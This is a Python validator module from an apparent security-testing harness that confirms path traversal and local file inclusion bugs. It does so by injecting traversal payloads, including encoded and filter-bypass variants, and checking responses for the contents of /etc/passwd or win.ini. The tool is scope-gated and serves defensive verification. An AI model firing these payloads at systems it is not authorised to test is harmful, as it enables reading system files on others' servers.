"""
Path-traversal / local-file-inclusion confirmation leg (deterministic, in-band
canonical-file signal).

Detection of this class had a hole the others didn't: there was no `path_traversal`
category at all, so a finding labelled "directory traversal" / "LFI" canonicalised
to nothing and was silently NOT_TESTED (categories.py now defines it). This leg is
the confirmation half: inject a traversal sequence and check the RESPONSE for the
unmistakable contents of a well-known system file -- `/etc/passwd` (`root:...:0:0:`)
on POSIX, `win.ini` (`[extensions]` / `for 16-bit app support`) on Windows.
Matching the actual file contents, not just a 200, is what separates a confirmed
read from a reflected echo.

The injection point can be a query/body parameter OR a path SEGMENT: file servers
commonly expose the name in the URL path itself (`/uploads/<id>` ->
`/uploads/..%2f..%2f..%2fetc%2fpasswd`), so the leg tries the last file-ish path
segment as well as file/path-shaped parameters.

Fires on path_traversal findings, or -- shape-decoupled, like the ssrf/xxe legs --
on any request with a file/path-shaped parameter or a file-ish path segment.
Scope-gated; active (validators.active_enabled), and a non-GET replay additionally
needs validators.allow_mutating_replay (safety gate).
"""
from __future__ import annotations

import re
from urllib.parse import urlsplit, urlunsplit, parse_qsl

import httpx

from harness import global_throttle
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import Validator, ValidationResult
from .injection_targets import param_targets, mutate, replay_headers

_FILE_PARAM_NAMES = {"file", "filename", "path", "filepath", "page", "template", "doc",
                     "document", "download", "load", "read", "include", "view", "img",
                     "image", "attachment", "name", "dir", "folder", "resource", "item"}
_FILE_VALUE = re.compile(r"(^|/)[\w\-. ]+\.\w{1,5}$|[\\/]")

# Path segments that mark a file-serving route whose traversal lives in the path
# segment itself. Single source of truth -- orchestrator's shape routing imports
# this so the two never drift.
FILEISH_PATH_SEGMENTS = {"uploads", "upload", "files", "file", "download", "downloads",
                         "attachment", "attachments", "static", "docs", "documents",
                         "media", "assets", "images", "img", "export", "reports"}

# Traversal payloads: deep POSIX + Windows, filter-bypass encodings (`....//`
# collapses to `../` after a naive strip; URL-encoded dots and encoded slashes for
# path-segment injection where a raw `../` would be normalised by the client).
_PREFIXES = ("../../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\..\\",
             "....//....//....//....//....//", "%2e%2e%2f" * 8, "..%2f" * 8,
             "%2e%2e/" * 8, "/", "")
_TARGETS = {
    "etc/passwd": re.compile(r"root:.*:0:0:", re.IGNORECASE),
    "windows/win.ini": re.compile(r"\[extensions\]|for 16-bit app support", re.IGNORECASE),
}
_MAX_PARAMS = 6
_PATHSEG = "pathseg"


def _file_shaped(exchange: HttpExchange) -> list[tuple[str, str]]:
    qs = dict(parse_qsl(urlsplit(exchange.url).query, keep_blank_values=True))
    out = []
    for loc, param in param_targets(exchange):
        val = qs.get(param, "") if loc == "query" else ""
        if param.lower() in _FILE_PARAM_NAMES or _FILE_VALUE.search(val or ""):
            out.append((loc, param))
    return out


def _last_segment_index(url: str) -> int | None:
    segs = urlsplit(url).path.split("/")
    for i in range(len(segs) - 1, -1, -1):
        if segs[i]:
            return i
    return None


def _fileish_segment(url: str) -> bool:
    segs = [s for s in urlsplit(url).path.split("/") if s]
    return any(s.lower() in FILEISH_PATH_SEGMENTS for s in segs)


def _mutate_last_segment(url: str, value: str) -> str | None:
    """Replace the last non-empty path segment with `value` verbatim (no
    re-encoding, so `%2e%2e%2f` survives into the path)."""
    parts = urlsplit(url)
    segs = parts.path.split("/")
    idx = None
    for i in range(len(segs) - 1, -1, -1):
        if segs[i]:
            idx = i
            break
    if idx is None:
        return None
    segs[idx] = value
    return urlunsplit((parts.scheme, parts.netloc, "/".join(segs), parts.query, parts.fragment))


class PathTraversalValidator(Validator):
    name = "path_traversal"
    finding_classes = {"path_traversal", "path traversal", "directory traversal",
                       "lfi", "local file inclusion", "file inclusion"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return (super().applies(finding, exchange) and bool(param_targets(exchange))) \
            or bool(_file_shaped(exchange)) or _fileish_segment(exchange.url)

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "path_traversal", summary=why)

    def _targets(self, exchange: HttpExchange) -> list[tuple[str, str]]:
        targets = list((_file_shaped(exchange) or param_targets(exchange))[:_MAX_PARAMS])
        if _last_segment_index(exchange.url) is not None:
            targets.append((_PATHSEG, ""))
        return targets

    def _mutated(self, exchange: HttpExchange, loc: str, param: str, value: str) -> tuple[str, str]:
        if loc == _PATHSEG:
            return (_mutate_last_segment(exchange.url, value) or exchange.url), (exchange.request_body or "")
        return mutate(exchange, loc, param, value)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and host not in self.allowed_hosts:
            return self._skip(f"host {host!r} out of scope")
        targets = self._targets(exchange)
        if not targets:
            return self._skip("no file/path-shaped parameter or path segment to inject a traversal into")
        method = (exchange.method or "GET").upper()
        headers = replay_headers(exchange)
        for loc, param in targets:
            for prefix in _PREFIXES:
                for target, marker in _TARGETS.items():
                    url, body = self._mutated(exchange, loc, param, prefix + target)
                    try:
                        await global_throttle.acquire()
                        async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                                    follow_redirects=False, verify=False) as client:
                            resp = await client.request(method, url, headers=headers or None,
                                                        content=body or None)
                    except SafetyGateBlocked:
                        return self._skip("mutating path-traversal replay not authorized "
                                          "(set validators.allow_mutating_replay)")
                    except httpx.HTTPError:
                        continue
                    try:
                        text = resp.text
                    except Exception:
                        continue
                    if marker.search(text):
                        where = "path segment" if loc == _PATHSEG else f"{loc} parameter {param!r}"
                        return ValidationResult(
                            self.name, "confirmed", "path_traversal", confidence=0.95, confirmed=True,
                            summary=f"Path traversal confirmed: the {where} read an arbitrary file "
                                    f"outside the intended directory.",
                            evidence=f"Injected `{prefix + target}` into the {where}; the response contained "
                                     f"the canonical contents of {target} (matched /{marker.pattern}/).")
        return ValidationResult(
            self.name, "not_confirmed", "path_traversal", confidence=0.0, confirmed=False,
            summary="No system-file contents returned -- traversal appears blocked or not a file read",
            evidence=f"Tried {len(targets)} injection point(s) across {len(_PREFIXES)} traversal encodings; "
                     f"neither /etc/passwd nor win.ini contents appeared.")
